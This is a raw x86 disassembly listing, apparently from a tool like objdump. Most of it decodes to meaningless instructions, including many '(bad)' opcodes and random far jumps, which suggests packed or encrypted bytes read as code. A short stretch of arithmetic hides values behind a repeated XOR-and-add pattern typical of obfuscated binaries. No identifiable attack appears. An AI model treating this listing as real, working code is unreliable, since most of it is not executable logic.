  4102aa:	push   cs
  4102ab:	adc    al,0x7b
  4102ad:	icebp  
  4102ae:	cdq    
  4102af:	addr16 dec ecx
  4102b1:	adc    al,0x51
  4102b3:	repnz lock shl ebp,1
  4102b7:	sub    eax,DWORD PTR [ecx]
  4102b9:	retf   
  4102ba:	loop   0x41023f
  4102bc:	push   0x921f2d57
  4102c1:	cmp    dl,bl
  4102c3:	push   cs
  4102c4:	daa    
  4102c5:	push   esi
  4102c6:	fisttp WORD PTR [ebx+0x9]
  4102c9:	ret    0xacde
  4102cc:	add    al,0x53
  4102ce:	push   edi
  4102cf:	(bad)  
  4102d0:	js     0x410286
  4102d2:	pop    esp
  4102d3:	ds je  0x4102e0
  4102d6:	or     esi,DWORD PTR [esi-0x51]
  4102d9:	sub    al,0x3e
  4102db:	(bad)  
  4102dc:	ins    BYTE PTR es:[edi],dx
  4102dd:	outs   dx,DWORD PTR ds:[esi]
  4102de:	gs pop ebx
  4102e0:	clc    
  4102e1:	fadd   st,st(4)
  4102e3:	sbb    esi,eax
  4102e5:	sbb    DWORD PTR [edx+0x5],ebp
  4102e8:	sti    
  4102e9:	popa   
  4102ea:	lahf   
  4102eb:	add    DWORD PTR ds:0x92c3091f,ecx
  4102f1:	fild   DWORD PTR [eax+ecx*2-0x43]
  4102f5:	sbb    eax,0x4fec556a
  4102fa:	or     BYTE PTR [edx+0xbde0b3],0x9f
  410301:	mov    eax,0x9e597d58
  410306:	outs   dx,BYTE PTR ds:[esi]
  410307:	adc    DWORD PTR [edx+0x2c],edi
  41030a:	sbb    al,0x94
  41030c:	sub    al,bh
  41030e:	int    0xdd
  410310:	ds mov cl,0x26
  410313:	sti    
  410314:	sbb    ebx,ebp
  410316:	stos   BYTE PTR es:[edi],al
  410317:	lock (bad) 
  410319:	popa   
  41031a:	dec    ebp
  41031b:	inc    eax
  41031c:	fiadd  DWORD PTR [eax+edi*4-0x17]
  410320:	push   ds
  410321:	out    0x4c,al
  410323:	jo     0x410381
  410325:	in     al,dx
  410326:	cli    
  410327:	jmp    0x1097:0x25d40b9a
  41032e:	sahf   
  41032f:	xor    BYTE PTR [eax],dh
  410331:	push   ecx
  410332:	(bad)  
  410334:	cmp    DWORD PTR [edi],0xffffffcc
  410337:	fimul  DWORD PTR [eax-0x57]
  41033a:	sub    edx,ebx
  41033c:	jl     0x410387
  41033e:	and    BYTE PTR [ecx],dl
  410340:	mov    ds:0xe8f7762a,al
  410345:	or     ch,BYTE PTR fs:[edi]
  410348:	cs call 0xf5b4:0xa47421c7
  410350:	add    DWORD PTR [edi],edi
  410352:	arpl   WORD PTR [ecx+0x62],sp
  410355:	push   ss
  410356:	cmp    dh,cl
  410358:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410359:	inc    ecx
  41035a:	cmp    BYTE PTR [esp+edx*1],ch
  41035d:	out    0xc2,al
  41035f:	jp     0x41039e
  410361:	loop   0x410341
  410363:	popa   
  410364:	push   ebx
  410365:	sub    ecx,ebx
  410367:	push   ebx
  410368:	fwait
  410369:	xor    al,0x88
  41036b:	add    DWORD PTR [ebp+edx*4-0x65],esi
  41036f:	(bad)  
  410370:	(bad)  
  410371:	pusha  
  410372:	add    BYTE PTR [edx+esi*2-0x5b],dl
  410376:	push   edx
  410377:	pop    edx
  410378:	mov    ecx,0xdfe166a9
  41037d:	jg     0x41038b
  41037f:	add    eax,0x74
  410382:	in     al,0x7a
  410384:	dec    esi
  410385:	mov    BYTE PTR [ebx],bl
  410387:	sbb    eax,0xd6359216
  41038c:	mov    bh,0x96
  41038e:	test   BYTE PTR [edi],bl
  410390:	mov    ah,0x75
  410392:	(bad)  
  410393:	ds inc edx
  410395:	xchg   esp,eax
  410396:	aas    
  410397:	or     BYTE PTR [esp+ebx*1-0x65a2e928],bh
  41039e:	dec    esp
  41039f:	dec    ebp
  4103a0:	cmp    dh,bl
  4103a2:	mov    ds:0xc1da1dfd,eax
  4103a7:	adc    eax,0xbcad6aa0
  4103ac:	inc    esp
  4103ad:	icebp  
  4103ae:	mov    ah,0x95
  4103b0:	(bad)  
  4103b1:	push   0x3b8a88c
  4103b6:	inc    eax
  4103b7:	xor    DWORD PTR [eax-0x4e47e04],edi
  4103bd:	add    BYTE PTR [eax],dl
  4103bf:	dec    edi
  4103c0:	xchg   edx,eax
  4103c1:	pop    es
  4103c2:	ret    
  4103c3:	pop    ebp
  4103c4:	adc    eax,DWORD PTR [edi+esi*4+0x74]
  4103c8:	adc    eax,0xdf1a41b7
  4103cd:	mov    edi,0x5d01483f
  4103d2:	cmp    esi,DWORD PTR [edi-0x680fac94]
  4103d8:	iret   
  4103d9:	pusha  
  4103da:	xchg   ecx,eax
  4103db:	sub    ah,cl
  4103dd:	pop    ebx
  4103de:	gs jmp 0xdb4ebb88
  4103e4:	imul   ebx,ebx,0xe732da48
  4103ea:	fidiv  DWORD PTR [ebx+0x1d]
  4103ed:	jno    0x41046d
  4103ef:	inc    edx
  4103f0:	cmp    ch,al
  4103f2:	stc    
  4103f3:	jp     0x410422
  4103f5:	mov    edx,0xac1cf75d
  4103fa:	xor    eax,0xf37e930f
  4103ff:	dec    edi
  410400:	add    bh,dl
  410402:	dec    esi
  410403:	jp     0x410416
  410405:	mov    dl,0x1f
  410407:	inc    esi
  410408:	jbe    0x4103f1
  41040a:	cmp    esi,DWORD PTR [ecx]
  41040c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41040d:	std    
  41040e:	inc    ecx
  41040f:	jp     0x41045e
  410411:	jge    0x410466
  410413:	(bad)  
  410414:	jmp    0x67bac123
  410419:	imul   esp,DWORD PTR [esi],0x906e5b2d
  41041f:	std    
  410420:	and    BYTE PTR [eax+0x6c],0x80
  410424:	mov    ah,0x68
  410426:	mul    BYTE PTR [ebp-0x78]
  410429:	mov    DWORD PTR [edx],0x15330745
  41042f:	jbe    0x4104a0
  410431:	xchg   esp,eax
  410432:	sbb    cl,bl
  410434:	cmp    BYTE PTR [eax+0x273d393],0xe3
  41043b:	jb     0x410495
  41043d:	mov    ch,0x85
  41043f:	adc    edx,DWORD PTR [ecx]
  410441:	or     bh,BYTE PTR [eax-0x23e87ea1]
  410447:	(bad)  
  410448:	ins    BYTE PTR es:[edi],dx
  410449:	test   BYTE PTR [ebp+ebp*8-0x7b63245c],0x1e
  410451:	cmp    dl,ah
  410453:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410454:	adc    eax,DWORD PTR [ebp-0xd]
  410457:	les    edx,FWORD PTR [edx+0x3120a0f6]
  41045d:	sub    eax,0x270e3580
  410462:	sub    bl,BYTE PTR [ebx+edx*8+0x44bad129]
  410469:	dec    edi
  41046a:	shl    DWORD PTR ds:0xe1fc7d9d,1
  410470:	push   ebx
  410471:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410472:	or     ah,BYTE PTR [ecx-0x14c12dfc]
  410478:	out    0x63,eax
  41047a:	pop    esp
  41047b:	je     0x41041a
  41047d:	je     0x4104c1
  41047f:	ja     0x4104e5
  410481:	and    DWORD PTR es:[edx-0x4bf714a8],0x10
  410489:	outs   dx,BYTE PTR ds:[esi]
  41048a:	ins    DWORD PTR es:[edi],dx
  41048b:	fcom   st(7)
  41048d:	mov    ds:0x417750aa,eax
  410492:	iret   
  410493:	add    esi,DWORD PTR [ecx-0x63]
  410496:	mov    ebx,cs
  410498:	xchg   esi,eax
  410499:	jecxz  0x410475
  41049b:	jmp    0x41049f
  41049d:	pop    esi
  41049e:	and    eax,0x525b8218
  4104a3:	clc    
  4104a4:	inc    ebp
  4104a5:	(bad)  
  4104a6:	popf   
  4104a7:	mov    ebx,0x304018bd
  4104ac:	mov    dl,0xc1
  4104ae:	inc    esi
  4104af:	jmp    0x2be53a2c
  4104b4:	xchg   esp,eax
  4104b5:	add    bh,BYTE PTR [edx+0x67]
  4104b8:	cmp    eax,0xd2102921
  4104bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104be:	lods   al,BYTE PTR ds:[esi]
  4104bf:	das    
  4104c0:	retf   0x685f
  4104c3:	pushw  es
  4104c5:	iret   
  4104c6:	sbb    DWORD PTR [edi],ebp
  4104c8:	inc    ebp
  4104c9:	out    dx,eax
  4104ca:	mov    edi,0x1f17cb6d
  4104cf:	mov    eax,ds:0x940a2e6c
  4104d4:	sub    BYTE PTR [edi+edi*4+0x59],bh
  4104d8:	jb     0x4104dc
  4104da:	hlt    
  4104db:	push   eax
  4104dc:	xchg   DWORD PTR [ebp+0x3e],ecx
  4104df:	lea    edi,ds:0xd03d1907
  4104e5:	adc    edx,DWORD PTR [eax+eiz*4-0x59]
  4104e9:	sub    eax,0xc6d62f91
  4104ee:	inc    ecx
  4104ef:	jecxz  0x41052c
  4104f1:	mov    ch,ah
  4104f3:	push   edi
  4104f4:	jb     0x410556
  4104f6:	add    bh,BYTE PTR [ecx+eax*2+0x64]
  4104fa:	int3   
  4104fb:	or     eax,0x81d31f40
  410500:	pop    edx
  410501:	mov    ds:0x4154dbdd,al
  410506:	inc    ebp
  410507:	popf   
  410508:	pop    ds
  410509:	xchg   ebx,eax
  41050a:	push   ds
  41050b:	xor    eax,0x76f76e5f
  410510:	sub    al,0x89
  410512:	sbb    ch,0x24
  410515:	mov    eax,0x18784dd5
  41051a:	push   ds
  41051b:	or     BYTE PTR [ebp-0x2e],cl
  41051e:	jecxz  0x410590
  410520:	into   
  410521:	imul   DWORD PTR [edx]
  410523:	rcr    dh,0x48
  410526:	aad    0x56
  410528:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410529:	aad    0xd7
  41052b:	add    edx,DWORD PTR [eax+0x2ea518d0]
  410531:	psubusw mm0,QWORD PTR [ebx-0x17f61255]
  410538:	push   0x89793613
  41053d:	repz jb 0x410549
  410540:	pop    edx
  410541:	bound  esp,QWORD PTR [edx]
  410543:	sub    DWORD PTR [edx+0x1a],ecx
  410546:	repnz inc ebx
  410548:	ja     0x41056b
  41054a:	add    al,0x7c
  41054c:	pusha  
  41054d:	scas   eax,DWORD PTR es:[edi]
  41054e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41054f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410550:	lea    edx,[eax]
  410552:	dec    ecx
  410553:	add    dl,BYTE PTR [edx+eax*8]
  410556:	jns    0x410565
  410558:	std    
  410559:	cmp    BYTE PTR [edi+0x3335c56],dl
  41055f:	mov    al,0x1c
  410561:	mov    esi,0x67aaef20
  410566:	lods   eax,DWORD PTR ds:[esi]
  410567:	sbb    DWORD PTR [edx-0x3f],0xffffffbe
  41056b:	iret   
  41056c:	test   eax,eax
  41056e:	je     0x411a02
  410574:	mov    DWORD PTR [ebp-0x24],esi
  410577:	jmp    0x41096b
  41057c:	in     eax,0xe6
  41057e:	outs   dx,DWORD PTR ds:[esi]
  41057f:	pop    ebp
  410580:	outs   dx,DWORD PTR ds:[esi]
  410581:	jne    0x410578
  410583:	data16 hlt 
  410585:	test   ebx,eax
  410587:	pushf  
  410588:	xor    al,ch
  41058a:	repnz aaa 
  41058c:	or     bh,BYTE PTR [edi+0x7d497070]
  410592:	jo     0x410604
  410594:	mov    ch,0x1a
  410596:	out    0xdc,eax
  410598:	test   al,0x73
  41059a:	idiv   cl
  41059c:	push   edi
  41059d:	jmp    0x41055c
  41059f:	push   ecx
  4105a0:	push   esp
  4105a1:	mov    ah,0xb0
  4105a3:	cmp    eax,0x9c20284f
  4105a8:	aaa    
  4105a9:	retf   0x26b9
  4105ac:	in     al,0x39
  4105ae:	push   eax
  4105af:	cmp    bl,0xfd
  4105b2:	pop    ss
  4105b3:	gs inc esi
  4105b5:	and    BYTE PTR [edx-0x4e83d46e],bl
  4105bb:	pop    edx
  4105bc:	dec    edi
  4105bd:	dec    esi
  4105be:	mov    al,0x8d
  4105c0:	mov    esi,0xf450efc7
  4105c5:	pop    ebp
  4105c6:	jg     0x4105a9
  4105c8:	ret    0x187a
  4105cb:	and    al,0xe9
  4105cd:	xchg   esi,eax
  4105ce:	xor    ah,BYTE PTR [esi+0x79]
  4105d1:	out    dx,eax
  4105d2:	neg    BYTE PTR [ecx]
  4105d4:	fcomp  QWORD PTR [edi+0x1c6bd39b]
  4105da:	fst    st(6)
  4105dc:	cmp    al,0x48
  4105de:	cdq    
  4105df:	call   0xd00f4881
  4105e4:	mov    WORD PTR [ebp-0x2bb3af8e],gs
  4105ea:	repz mov ds:0xbedd601,al
  4105f0:	jle    0x4105f3
  4105f2:	add    bl,BYTE PTR [edx+edx*8+0x3f9f09e7]
  4105f9:	pop    eax
  4105fa:	jae    0x4105cf
  4105fc:	jl     0x4105e9
  4105fe:	cdq    
  4105ff:	xchg   esp,eax
  410600:	outs   dx,BYTE PTR ds:[esi]
  410601:	xchg   ecx,eax
  410602:	mov    esp,ecx
  410604:	mov    al,ds:0x3a78dcac
  410609:	xchg   ecx,eax
  41060a:	push   0xffffffa8
  41060c:	fs cwde 
  41060e:	add    cl,BYTE PTR [eax-0x78]
  410611:	and    dl,BYTE PTR ds:0x534ee9c5
  410617:	push   ds
  410618:	sti    
  410619:	leave  
  41061a:	inc    ecx
  41061b:	hlt    
  41061c:	jmp    0x647b:0xebb0c22d
  410623:	loope  0x4105eb
  410625:	call   0x51dea27
  41062a:	jl     0x410637
  41062c:	mov    dl,0x1e
  41062e:	push   edi
  41062f:	cmp    BYTE PTR [ebx-0x3d],ah
  410632:	daa    
  410633:	push   0xffffffcf
  410635:	inc    ecx
  410636:	stos   BYTE PTR es:[edi],al
  410637:	push   ebx
  410638:	popf   
  410639:	lods   eax,DWORD PTR ds:[esi]
  41063a:	scas   eax,DWORD PTR es:[edi]
  41063b:	jb     0x410614
  41063d:	gs push es
  41063f:	mov    al,0x58
  410641:	cdq    
  410642:	ins    BYTE PTR es:[edi],dx
  410643:	pop    ebp
  410644:	popf   
  410645:	mov    esi,0x2578eee2
  41064a:	mov    ah,0x89
  41064c:	ds mov ebp,0x57c76917
  410653:	scas   eax,DWORD PTR es:[edi]
  410654:	adc    BYTE PTR [ecx],ch
  410656:	sub    eax,0x27415e98
  41065b:	jb     0x4106d0
  41065d:	adc    BYTE PTR [ecx-0x23],0x40
  410661:	test   BYTE PTR [edx],dl
  410663:	xchg   edi,eax
  410664:	lods   al,BYTE PTR ds:[esi]
  410665:	popf   
  410666:	inc    ebp
  410667:	cmp    ecx,DWORD PTR [ebx-0x77898b44]
  41066d:	push   ds
  41066e:	jecxz  0x410625
  410670:	mov    DWORD PTR [eax-0x4b8ed901],esi
  410676:	test   al,0xf9
  410678:	fucompp 
  41067a:	daa    
  41067b:	dec    edi
  41067c:	push   ecx
  41067d:	retf   0x2937
  410680:	sub    al,0xa5
  410682:	int    0x5b
  410684:	dec    edx
  410685:	dec    edx
  410686:	and    BYTE PTR [ecx+0x46],al
  410689:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41068a:	fdiv   QWORD PTR [edi+0x596d94fc]
  410690:	popa   
  410691:	pop    esi
  410692:	push   es
  410693:	push   eax
  410694:	das    
  410695:	dec    ebx
  410696:	jl     0x4106c4
  410698:	icebp  
  410699:	inc    ecx
  41069a:	pop    edx
  41069b:	aam    0x53
  41069d:	fisub  DWORD PTR [edx-0x70514bb9]
  4106a3:	push   ebx
  4106a4:	enter  0x4e2d,0xcc
  4106a8:	mov    WORD PTR [ecx-0x4f8b1a1f],gs
  4106ae:	and    al,0x45
  4106b0:	aaa    
  4106b1:	pop    edi
  4106b2:	and    DWORD PTR [ecx],eax
  4106b4:	mov    ds:0xd199516c,al
  4106b9:	cmp    DWORD PTR [edx-0x7474a5b7],edx
  4106bf:	cdq    
  4106c0:	out    0x3f,al
  4106c2:	in     eax,0x6b
  4106c4:	mov    edi,DWORD PTR [ecx+0x2d]
  4106c7:	mov    dh,0xff
  4106c9:	jp     0x4106cb
  4106cb:	adc    ebx,DWORD PTR [ecx+0x5a]
  4106ce:	mov    edi,ebx
  4106d0:	pop    esp
  4106d1:	and    al,0xa2
  4106d3:	out    dx,eax
  4106d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106d5:	inc    esi
  4106d6:	(bad)  
  4106d7:	xchg   edx,eax
  4106d8:	cmp    DWORD PTR [ebp+0x43787b46],ebx
  4106de:	xchg   edx,eax
  4106df:	out    0x16,al
  4106e1:	(bad)  
  4106e2:	sub    al,BYTE PTR [edx+esi*4+0x23]
  4106e6:	push   ebx
  4106e7:	cwde   
  4106e8:	test   BYTE PTR [esi-0x5b],dh
  4106eb:	bound  ecx,QWORD PTR [eax]
  4106ed:	add    BYTE PTR [ecx],al
  4106ef:	sti    
  4106f0:	xchg   ecx,eax
  4106f1:	retf   0xf34d
  4106f4:	jo     0x4106bc
  4106f6:	fs and al,0x12
  4106f9:	popf   
  4106fa:	retf   
  4106fb:	sbb    al,0xb
  4106fd:	pop    ebp
  4106fe:	std    
  4106ff:	aaa    
  410700:	int    0xfe
  410702:	adc    bl,BYTE PTR [ebx]
  410704:	outs   dx,DWORD PTR ds:[esi]
  410705:	push   0x4d245919
  41070a:	mov    bl,0x80
  41070c:	jae    0x410760
  41070e:	(bad)  
  41070f:	(bad)  
  410711:	cdq    
  410712:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410713:	and    bl,BYTE PTR [edi+0x54]
  410716:	sub    al,ch
  410718:	inc    esp
  410719:	push   edi
  41071a:	xor    al,BYTE PTR ds:0x8ce5575e
  410720:	cli    
  410721:	(bad)  
  410722:	pop    ds
  410723:	imul   DWORD PTR [edi-0x506e4c92]
  410729:	rcl    BYTE PTR [ecx],cl
  41072b:	push   ss
  41072c:	inc    eax
  41072d:	and    al,0xe6
  41072f:	xchg   ecx,eax
  410730:	jne    0x410779
  410732:	outs   dx,DWORD PTR ds:[esi]
  410733:	pop    es
  410734:	ret    0xba5b
  410737:	iret   
  410738:	sar    BYTE PTR [edx],cl
  41073a:	inc    edi
  41073b:	stos   DWORD PTR es:[edi],eax
  41073c:	mov    esi,0x26af867f
  410741:	mov    WORD PTR [ebp+edi*8+0x4725b8f9],ss
  410748:	div    BYTE PTR [esi+0x5a]
  41074b:	and    DWORD PTR [ebx],esp
  41074d:	repz and BYTE PTR [edx-0x16],ch
  410751:	jle    0x4106ed
  410753:	xor    DWORD PTR [eax+eax*1-0x15756e4d],ecx
  41075a:	popf   
  41075b:	in     eax,dx
  41075c:	in     eax,0x71
  41075e:	inc    ecx
  41075f:	ja     0x410721
  410761:	dec    edi
  410762:	xor    bh,BYTE PTR [edi-0x4c]
  410765:	jl     0x410782
  410767:	add    al,0xb5
  410769:	stos   BYTE PTR es:[edi],al
  41076a:	ret    
  41076b:	scas   al,BYTE PTR es:[edi]
  41076c:	arpl   WORD PTR [eax],bx
  41076e:	sub    BYTE PTR [ebp-0x57],ah
  410771:	je     0x4107d3
  410773:	rep outs dx,BYTE PTR ds:[esi]
  410775:	pop    eax
  410776:	push   ebp
  410777:	sbb    esi,DWORD PTR [edi]
  410779:	div    BYTE PTR ss:[edi+0x648f06ea]
  410780:	adc    BYTE PTR [eax],ch
  410782:	sub    eax,0xf96dd875
  410787:	out    dx,al
  410788:	sbb    DWORD PTR [esi],0xffffff9d
  41078b:	mov    gs,WORD PTR [esi+0x851386c]
  410791:	imul   ecx,DWORD PTR ds:0x59790fab,0x68
  410798:	hlt    
  410799:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41079a:	mov    al,ds:0x4ee3fffd
  41079f:	push   es
  4107a0:	out    dx,al
  4107a1:	cmp    al,BYTE PTR [ebx]
  4107a3:	(bad)  
  4107a4:	test   DWORD PTR [edx],0xd95436eb
  4107aa:	push   es
  4107ab:	cmp    al,0xe5
  4107ad:	pop    es
  4107ae:	xor    al,0xb5
  4107b0:	or     eax,DWORD PTR [eax+0x165a9c22]
  4107b6:	mov    WORD PTR [esi-0x15],ss
  4107b9:	int3   
  4107ba:	mov    esi,0x460886ca
  4107bf:	cmp    esp,DWORD PTR [esi-0x25]
  4107c2:	xacquire xchg BYTE PTR [esi+0x322da2c1],al
  4107c9:	jae    0x410822
  4107cb:	mov    ds:0x3c29a0fa,al
  4107d0:	xor    al,0x68
  4107d2:	push   ebp
  4107d3:	aas    
  4107d4:	aaa    
  4107d5:	das    
  4107d6:	jp     0x4107d9
  4107d8:	xchg   ebp,eax
  4107d9:	dec    edx
  4107da:	outs   dx,BYTE PTR ds:[esi]
  4107db:	inc    edi
  4107dc:	test   al,0xbd
  4107de:	cmp    eax,0x60a8f8cf
  4107e3:	sbb    DWORD PTR [edx-0x21aa74d1],edi
  4107e9:	loope  0x4107a4
  4107eb:	mov    bl,BYTE PTR ds:0xe1a58274
  4107f1:	adc    DWORD PTR [ecx+0x163c8d5a],eax
  4107f7:	push   ecx
  4107f8:	or     BYTE PTR ds:0x7a255884,ch
  4107fe:	hlt    
  4107ff:	pop    es
  410800:	ror    esi,0x22
  410803:	jo     0x4107f9
  410805:	cmc    
  410806:	dec    esi
  410807:	pop    eax
  410808:	les    ebx,FWORD PTR [ebx+0xc]
  41080b:	and    DWORD PTR [ecx-0x3f],ecx
  41080e:	mov    esp,0x8099a544
  410813:	sahf   
  410814:	repz sub al,0xab
  410817:	sub    eax,0x7f6dbf9e
  41081c:	dec    esi
  41081d:	outs   dx,BYTE PTR ds:[esi]
  41081e:	loopne 0x41089c
  410820:	pop    eax
  410821:	in     eax,0xf9
  410823:	pop    esi
  410824:	pop    ebp
  410825:	cs ja  0x4108a2
  410828:	dec    edx
  410829:	dec    esp
  41082a:	shl    BYTE PTR [eax+0x1f],1
  41082d:	jmp    0x4108a3
  41082f:	jo     0x41087c
  410831:	mov    eax,0xcc29e693
  410836:	popa   
  410837:	lock jo 0x41088b
  41083a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41083b:	push   ds
  41083c:	inc    ebp
  41083d:	pop    eax
  41083e:	jge    0x410830
  410840:	push   edi
  410841:	dec    edi
  410842:	jbe    0x4107f0
  410844:	repz test al,0x32
  410847:	adc    eax,0x8c08af90
  41084c:	mov    DWORD PTR cs:[ebp+0x5bd82f8],edx
  410853:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410854:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410855:	cmp    al,0x4e
  410857:	mov    eax,0x34eeb6d6
  41085c:	outs   dx,BYTE PTR ds:[esi]
  41085d:	ds ins DWORD PTR es:[edi],dx
  41085f:	mov    BYTE PTR [esi+0x1601ecd3],0x86
  410866:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410867:	pop    esi
  410868:	mov    eax,0xeb336b3d
  41086d:	jbe    0x410860
  41086f:	jae    0x4108c3
  410871:	js     0x4108a1
  410873:	je     0x4108b4
  410875:	mov    ch,0x41
  410877:	or     ebp,ecx
  410879:	or     al,0x67
  41087b:	adc    ch,BYTE PTR fs:[ecx]
  41087e:	aas    
  41087f:	mov    edx,0xb2c74351
  410884:	push   eax
  410885:	or     edi,DWORD PTR [eax+0x7f44645c]
  41088b:	pop    esp
  41088c:	inc    edx
  41088d:	in     eax,0xb1
  41088f:	call   0xf1d7ca28
  410894:	xchg   ecx,eax
  410895:	int3   
  410896:	pusha  
  410897:	sub    edx,edx
  410899:	xor    BYTE PTR [esi+0x32],ch
  41089c:	dec    ebp
  41089d:	(bad)  
  41089e:	add    esi,ebx
  4108a0:	in     al,dx
  4108a1:	nop
  4108a2:	clc    
  4108a3:	inc    ebp
  4108a4:	into   
  4108a5:	push   ss
  4108a6:	or     eax,0x9e6c9bc2
  4108ab:	jmp    0x410892
  4108ad:	fld    QWORD PTR [ecx+0x1630a233]
  4108b3:	into   
  4108b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108b5:	pop    ecx
  4108b6:	retf   0xf3f4
  4108b9:	push   edx
  4108ba:	out    0x75,al
  4108bc:	push   eax
  4108bd:	loop   0x4108f5
  4108bf:	outs   dx,DWORD PTR ds:[esi]
  4108c0:	repnz add bh,BYTE PTR [ecx-0x5df7260b]
  4108c7:	cmp    al,0xe9
  4108c9:	pop    ds
  4108ca:	xchg   esi,eax
  4108cb:	mov    BYTE PTR [edi+edx*4+0x1a],dh
  4108cf:	(bad)  
  4108d0:	adc    cl,BYTE PTR [edx+esi*1]
  4108d3:	mov    ebx,0xf1dcf08f
  4108d8:	imul   edx,DWORD PTR [esi+0x47],0xffffffdf
  4108dc:	rcl    esp,1
  4108de:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108e0:	mov    dh,0x59
  4108e2:	xchg   esi,eax
  4108e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108e4:	repnz inc esi
  4108e6:	xlat   BYTE PTR ds:[ebx]
  4108e7:	xor    ah,bl
  4108e9:	arpl   WORD PTR [esi-0x712a120d],sp
  4108ef:	sbb    eax,0x2ed4da61
  4108f4:	dec    BYTE PTR ds:0xc55589d6
  4108fa:	iret   
  4108fb:	(bad)  
  4108fc:	mov    edi,DWORD PTR [eax-0x67de7f62]
  410902:	lods   eax,DWORD PTR cs:[esi]
  410904:	into   
  410905:	or     eax,0xaa0d9804
  41090a:	pop    ebp
  41090c:	push   esp
  41090d:	fisttp WORD PTR [ecx-0x2295f6d6]
  410913:	jb     0x410941
  410915:	mov    esp,0x9521eb44
  41091a:	fdiv   st,st(5)
  41091c:	jbe    0x4108c3
  41091e:	in     eax,dx
  41091f:	jle    0x410912
  410921:	ret    0xce5f
  410924:	sar    dl,cl
  410926:	sahf   
  410927:	jmp    0xddd2:0x678e74ac
  41092e:	xchg   BYTE PTR [esi+0x1e3f7819],bh
  410934:	outs   dx,DWORD PTR ds:[esi]
  410935:	xor    al,ch
  410937:	in     eax,0x5a
  410939:	or     DWORD PTR [ebx],edi
  41093b:	xchg   ebp,eax
  41093c:	cmp    al,0x91
  41093e:	in     eax,0xfe
  410940:	(bad)  
  410941:	xlat   BYTE PTR ds:[ebx]
  410942:	arpl   WORD PTR ds:[ebp+0x16965be8],sp
  410949:	jns    0x4108e7
  41094b:	hlt    
  41094c:	loope  0x4108d9
  41094e:	fst    DWORD PTR [esi]
  410950:	xlat   BYTE PTR ds:[ebx]
  410951:	in     eax,0xe4
  410953:	add    BYTE PTR [eax-0x2f],0x6c
  410957:	cdq    
  410958:	and    BYTE PTR [ebp+0x7f85d753],bh
  41095e:	mov    bl,0xdc
  410960:	stos   BYTE PTR es:[edi],al
  410961:	inc    esp
  410962:	fnstcw WORD PTR [esp+edi*1]
  410965:	add    BYTE PTR [ebx-0x36],0x72
  410969:	inc    ebx
  41096a:	in     eax,dx
  41096b:	push   0xb
  41096d:	pop    ecx
  41096e:	push   0x5
  410970:	dec    ecx
  410971:	pop    ebx
  410972:	xchg   ebx,ecx
  410974:	sub    ebx,ecx
  410976:	xchg   ebx,ecx
  410978:	dec    ecx
  410979:	mov    eax,DWORD PTR [ebp-0x1c]
  41097c:	imul   eax,ecx
  41097f:	sub    esp,eax
  410981:	mov    DWORD PTR [ebp-0x24],esp
  410984:	mov    eax,DWORD PTR [ebp-0x4]
  410987:	mov    ecx,0x7510855
  41098c:	xor    eax,ecx
  41098e:	mov    edx,0x32729c
  410993:	add    eax,edx
  410995:	mov    DWORD PTR [ebp+0x8],eax
  410998:	mov    eax,DWORD PTR [ebp-0x18]
  41099b:	xor    eax,ecx
  41099d:	add    eax,edx
  41099f:	mov    edx,DWORD PTR [ebp+0x14]
  4109a2:	imul   eax,DWORD PTR [edx]
  4109a5:	mov    edx,DWORD PTR [ebp-0x4]
  4109a8:	xor    edx,ecx
  4109aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4109ad:	lea    ecx,[edx+ecx*1+0x32729c]
  4109b4:	cmp    ecx,eax
  4109b6:	je     0x4119fd
  4109bc:	mov    edi,DWORD PTR [ebp-0x18]
  4109bf:	mov    eax,DWORD PTR [ebp+0x8]
  4109c2:	mov    edx,DWORD PTR [ebp+0x14]
  4109c5:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4109c9:	mov    ecx,0x7510855
  4109ce:	xor    edx,edx
  4109d0:	xor    edi,ecx
  4109d2:	mov    esi,0x32729c
  4109d7:	add    edi,esi
  4109d9:	div    edi
  4109db:	mov    edx,DWORD PTR [ebp-0x4]
  4109de:	xor    edx,ecx
  4109e0:	lea    eax,[edx+eax*1+0x32729c]
  4109e7:	mov    edx,DWORD PTR [ebp+0x8]
  4109ea:	mov    edi,DWORD PTR [ebp-0x24]
  4109ed:	mov    DWORD PTR [edi+edx*4],eax
  4109f0:	mov    eax,DWORD PTR [ebp-0x18]
  4109f3:	jmp    0x410de7
  4109f8:	ja     0x41099d
  4109fa:	mov    ecx,0x7175496f
  4109ff:	mov    ds:0xd6da6ce9,eax
  410a04:	popa   
  410a05:	mov    ds:0xbc634073,eax
  410a0a:	jo     0x410a7c
  410a0c:	dec    ecx
  410a0d:	jge    0x410a7f
  410a0f:	jo     0x4109dc
  410a11:	xchg   ecx,eax
  410a12:	xchg   edx,eax
  410a13:	fxch   st(6)
  410a15:	icebp  
  410a16:	mov    eax,ds:0x10a3ee72
  410a1b:	into   
  410a1c:	nop
  410a1d:	mul    dl
  410a1f:	dec    eax
  410a20:	stos   BYTE PTR es:[edi],al
  410a21:	inc    edx
  410a22:	shl    BYTE PTR [esp+esi*8],0x9
  410a26:	pushf  
  410a27:	xchg   BYTE PTR [esi],bh
  410a29:	pop    ebx
  410a2a:	add    BYTE PTR [ecx-0x47],bl
  410a2d:	and    BYTE PTR ds:0x794ad980,dh
  410a33:	call   DWORD PTR [ebx-0x62]
  410a36:	popa   
  410a37:	pop    eax
  410a38:	test   BYTE PTR [edi],bh
